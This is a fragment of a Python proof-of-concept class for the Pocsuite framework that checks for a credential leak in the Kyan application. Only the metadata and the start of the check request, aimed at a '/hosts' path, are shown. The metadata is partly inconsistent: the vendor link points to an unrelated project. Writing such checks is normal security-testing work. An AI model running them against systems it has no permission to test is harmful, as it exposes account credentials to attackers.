...
class Kyann(POCBase):
    ...
    name = "Kyan 账号密码泄露"  # PoC 名称
    appPowerLink = "https://github.com/apolloconfig/apollo"  # 漏洞厂商主页地址
    appName = "Kyan"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    ...
    def _check(self):
        # 漏洞验证代码
        headers = {"Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"100\"", "Sec-Ch-Ua-Mobile": "?0",
        ...
        result = []
        try:
            url = str(self.target).strip() + "/hosts"
